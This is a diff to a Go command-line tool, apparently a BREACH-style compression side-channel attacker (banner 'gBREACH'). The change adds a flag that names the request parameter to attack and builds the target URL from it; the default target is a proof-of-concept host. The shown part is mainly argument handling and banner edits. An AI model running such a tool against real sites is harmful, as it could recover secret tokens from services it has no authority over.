@@ -90,8 +90,9 @@ func try_many(Url string, Options [16]string, Token string, Padding string, max_
 
 func main() {
 	// URL Argument -url=foo
-	urlPtr := flag.String("url", "https://malbot.net/poc/?request_token='", "Url to attack")
-	
+	urlPtr := flag.String("url", "https://malbot.net/poc/", "Url to attack")
+	// PARAM Argument -param=foo
+	paramPtr := flag.String("param", "request_token", "Parameter to attack")
 	// PADDING Argument -padding=foo
 	paddingPtr := flag.String("padding", "{}{}{}{}{}", "Padding after token")
 	
@@ -104,9 +105,9 @@ func main() {
 	
 
 	// MAIN
-        fmt.Println("      ____________ _____ ___  _____ _   _ ")
-	fmt.Println("      | ___ \\ ___ \\  ___/ _ \\/  __ \\ | | |")
-	fmt.Println("  __ _| |_/ / |_/ / |__/ /_\\ \\ /  \\/ |_| |")
+        fmt.Println("    ; ____________ _____ ___  _____ _   _ ")
+	fmt.Println("    \\ | ___ \\ ___ \\  ___/ _ \\/  __ \\ | | |")
+	fmt.Println("  __/_| |_/ / |_/ / |__/ /_\\ \\ /  \\/ |_| |")
 	fmt.Println(" / _` | ___ \\    /|  __|  _  | |   |  _  |")
 	fmt.Println("| (_| | |_/ / |\\ \\| |__| | | | \\__/\\ | | |")
 	fmt.Println(" \\__, \\____/\\_| \\_\\____|_| |_/\\____|_| |_/")
@@ -114,10 +115,11 @@ func main() {
 	fmt.Println(" |___/                                    ")
 	fmt.Println("+----------------------------------------+")
 	fmt.Println(" *Url: ", *urlPtr)
+	fmt.Println(" *Param: ", *paramPtr)
 	fmt.Println(" *Padding: ", *paddingPtr)
 	fmt.Println(" *Length: ", *lenPtr)
 	fmt.Println("+----------------------------------------+\n")
-	out := try_many(*urlPtr, Options, "", *paddingPtr, *lenPtr)
+	out := try_many(*urlPtr + "?" + *paramPtr + "='", Options, "", *paddingPtr, *lenPtr)
 	fmt.Println("\n--------")
 	fmt.Println("Output: " + out)
 }
